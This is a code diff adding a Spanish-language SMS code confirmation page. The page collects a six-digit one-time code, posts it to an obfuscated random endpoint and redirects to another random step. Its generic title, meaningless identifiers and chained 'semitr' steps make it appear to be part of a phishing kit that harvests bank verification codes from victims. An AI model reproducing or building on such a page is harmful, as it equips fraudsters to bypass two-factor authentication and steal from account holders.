@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Document</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <div>
+        <div>
+            <div class="tappa">
+                <img src="./img/hedapo2.png" alt="">
+            </div>
+        </div>
+
+        <div>
+            <div>
+                <p class="pp1">Confirmación </p>
+            </div>
+            <div class="qlwa">
+                <form method="post" id="semitr1">
+                    <div>
+                        <div class="part1">
+                            <p>Introduce los últimos 6 dígitos de la clave recibida en tu móvil 6XXXXXXXX.</p>
+                            <div class="otp-container pt2">
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                            </div>
+                        </div>
+                        <div id="smsCodeError" style="color: red; margin-top: 10px; font-size: 0.9rem;"></div>
+
+                        <button type="submit">Confirmar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+<script src="js/script.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const form = document.getElementById('semitr1');
+        const smsCodeError = document.getElementById('smsCodeError');
+        const otpInputs = document.querySelectorAll('.otp-input');
+
+        // Clear error when user starts typing in any input
+        otpInputs.forEach(input => {
+            input.addEventListener('input', function () {
+                smsCodeError.textContent = '';
+                input.classList.remove('input-error');
+            });
+        });
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Combine OTP inputs
+            let smsCode = '';
+            otpInputs.forEach(input => {
+                smsCode += input.value;
+            });
+
+            // Validate SMS code
+            if (smsCode.length !== 6 || !/^\d+$/.test(smsCode)) {
+                smsCodeError.textContent = 'El código debe tener 6 dígitos.';
+                return false;
+            }
+
+            // Show processing state
+            const submitButton = form.querySelector('button[type="submit"]');
+            const originalButtonText = submitButton.textContent;
+            submitButton.textContent = 'Procesando...';
+            submitButton.disabled = true;
+
+            $.ajax({
+                url: '/m4kT9BQWt7KTDdaVmafx', // This is the 'sms1 post' endpoint
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ code: smsCode }),
+                success: function (info) {
+                    if (info.OK) {
+                        // Redirect to the next step (semitr-2.ejs)
+                        window.location = "/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM";
+                    } else {
+                        // Show error message
+                        smsCodeError.textContent = 'Código inválido. Por favor, verifique su entrada.';
+
+                        // Reset button
+                        submitButton.textContent = originalButtonText;
+                        submitButton.disabled = false;
+
+                        // Clear inputs
+                        otpInputs.forEach(input => input.value = '');
+                        otpInputs[0].focus();
+                    }
+                },
+                error: function (xhr, status, error) {
+                    // Show error message
+                    smsCodeError.textContent = 'Ocurrió un error. Por favor, inténtelo de nuevo.';
+
+                    // Reset button
+                    submitButton.textContent = originalButtonText;
+                    submitButton.disabled = false;
+                }
+            });
+        });
+    });
+</script>
+
+</html>
